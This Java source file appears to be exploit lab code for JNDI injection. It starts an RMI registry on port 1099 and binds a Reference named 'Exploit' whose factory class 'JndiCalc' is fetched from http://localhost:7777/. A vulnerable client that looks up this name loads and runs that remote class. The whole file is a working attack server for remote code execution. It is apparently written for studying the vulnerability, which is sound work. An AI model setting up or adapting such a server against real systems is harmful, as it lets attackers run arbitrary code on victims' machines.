import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        // RMI
//         initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());
        // JNDI 注入漏洞
        Reference reference = new Reference("JndiCalc","JndiCalc","http://localhost:7777/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        System.out.println("[*]Binding 'Exploit' to 'rmi://127.0.0.1:1099/Exploit'");
        registry.bind("Exploit", referenceWrapper);
    }
}
